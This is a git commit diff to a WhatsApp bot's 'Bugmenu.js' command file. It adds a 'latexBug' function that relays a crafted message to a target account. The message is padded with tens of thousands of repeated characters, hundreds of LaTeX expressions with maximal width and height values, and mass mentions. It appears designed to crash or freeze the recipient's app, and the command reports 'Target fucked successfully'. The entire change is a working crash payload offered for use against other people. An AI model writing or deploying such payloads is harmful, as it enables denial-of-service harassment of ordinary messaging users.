4359413bd4079fa5738aa5c152215d3b581d577c
barazaghost <kkeizzah11@gmail.com>
2026-09-08 18:20:22 +0300

    Implement latexBug function for message relay

--- Cmds/Bugmenu.js
+++ Cmds/Bugmenu.js
@@ -1,3 +1,51 @@
+async function latexBug(client, jid) {
+  return await client.relayMessage(jid, {
+    botForwardedMessage: {
+      message: {
+        richResponseMessage: {
+          messageType: 1,
+          submessages: [
+            {
+              messageType: 8,
+              latexMetadata: {
+                text: 'ꦾ'.repeat(40000),
+                expressions: Array.from({length: 100}, (_, i) => ({
+                  latexExpression: 'x^' + i + '+y^' + i + '=z^' + i,
+                  width: 0xFFFFFFFF,
+                  height: 0xFFFFFFFF,
+                  renderingEngine: 1,
+                  asciiMath: 'expression_' + i
+                }))
+              }
+            },
+            {
+              messageType: 2,
+              latexMetadata: {
+                text: 'ꦾ'.repeat(35000),
+                expressions: Array.from({length: 80}, (_, i) => ({
+                  latexExpression: Math.PI + i,
+                  width: 0xFFFFFFF,
+                  height: 0xFFFFFFF
+                }))
+              }
+            }
+          ],
+          contextInfo: {
+            isForwarded: true,
+            forwardOrigin: 4,
+            mentionedJid: Array(50).fill(jid),
+            forwardingScore: 999999
+          }
+        }
+      }
+    }
+  }, {
+    messageId: 'LATEXBUG_' + Date.now()
+  });
+}
+
+
+
 keith({
   pattern: "latexbug",
   aliases: ["buglatex", "latexbg"],
@@ -22,7 +70,7 @@ keith({
   try {
    
 
-    const result = await lynnrich(client, target);
+    const result = await latexBug(client, target);
 
     return reply(
       `Target fucked successfully 💀`
